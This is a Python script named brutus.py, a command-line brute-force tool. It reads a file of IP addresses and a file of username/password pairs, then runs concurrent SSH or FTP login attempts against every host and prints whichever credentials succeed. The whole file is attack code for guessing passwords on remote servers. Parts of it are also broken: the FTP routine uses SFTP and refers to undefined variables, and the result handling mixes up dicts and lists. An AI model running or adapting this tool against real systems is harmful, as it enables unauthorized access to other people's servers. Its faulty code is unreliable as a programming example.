#!/usr/bin/python3
"""
Usage:
  brutus.py -h | --help
  brutus.py (--rhosts=<rhosts> --credentials=<credentials> --service=<service>)
 
Options:
  --rhosts=<rhosts>             Single ip per line
  --credentials=<credentials>   Credentials file space seperate user/pass per line
  --service=<service>           SSH or FTP
"""


import ipaddress
import paramiko
import concurrent.futures
from docopt import docopt



def parse_rhosts_file(rhosts_file):
    """
    Parse rhosts file and create a list.

    Arguments:
        rhosts_file:    file of ip address one per line
    """
    print("parsing rhosts file: {}".format(rhosts_file))
    rhosts = []
    with open(rhosts_file, "r") as file:
        for line in file:
            ip = line.strip("\n")
            try:
                ipaddress.ip_address(ip)
                rhosts.append(ip)
            except Exception:
                print("ip addres not valid: {}".format(ip))
                pass
    print(rhosts)
    return rhosts

def format_credentials(credentials_file):
    """
    Create a dictionary holding the users with passwords.

    Arguments:
        credentials_file:   The source file passed into the cli tool
    """
    print("Formating credentials into a dict from source file: {}".format(credentials_file))
    credentials = {}
    with open(credentials_file, "r") as file:
        for line in file:
            creds = line.strip("\n").split(" ")
            credentials[creds[0]] = creds[1]
    print(credentials)
    return credentials

def ssh_test(testuser, testpassword, ip, port=22, timeout=5):
    """
    Test user login.
    
    Arguments:
        testuser:       username to test
        testpassword:   password for the user
    
    Return:
        Returns True for success False for failure and the server ip
    """
    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.WarningPolicy)
        
        client.connect(ip, port=port, username=testuser, password=testpassword, timeout=5)
        client.close()
        return True
    except Exception:
        print("failed to login to {} with user {} and password {}".format(ip, testuser, testpassword))
        return False

def ftp_test(testuser, testpassword, ip, port=21, timeout=5):
    """
    Test user login.
    
    Arguments:
        testuser:       username to test
        testpassword:   password for the user
    
    Return:
        Returns True for success False for failure and the server ip
    """
    try:
        t = paramiko.Transport((ip, port))
        t.connect(username=testuser, password=testpassword, timeout=5)
        sftp = paramiko.SFTPClient.from_transport(t)
        sftp.get(source, dest)
        return True
    except Exception:
        print("failed to login to {} with user {} and password {}".format(ip, testuser, testpassword))
        return False

def concurrent_login_attempts(service, credentials, rhosts):
    """
    currently run login attempts for a service

    Arguments:
        method:             The method for the desired service
        credential_file:    A dictionary of credentials
    """
    print("running concurrent login attampts for service {}".format(service))
    results_list = {}
    for username, password in credentials.items():
        with concurrent.futures.ProcessPoolExecutor(max_workers=50) as pool:
            if service.lower() == "ssh":
                results = {pool.submit(ssh_test, username, password, str(ip)): ip for ip in rhosts}
                for future in concurrent.futures.as_completed(results):
                    if future.result():
                        results_list[ip] = {"username": username, "password": password, "login": future.result()}
            elif service.lower() == "ftp":
                results = {pool.submit(ftp_test, username, password, str(ip)): ip for ip in rhosts}
                for future in concurrent.futures.as_completed(results):
                    if future.result():
                        results_list.append(future.result())
    if results_list:
        print(results_list)
    else:
        print("Nothing to report, move along")
    return results_list


def main():
    opts = docopt(__doc__)

    rhosts = parse_rhosts_file(opts['--rhosts'])
    credentials = format_credentials(opts['--credentials'])
    results = concurrent_login_attempts(opts['--service'], credentials, rhosts)


if __name__ == '__main__':
    main()
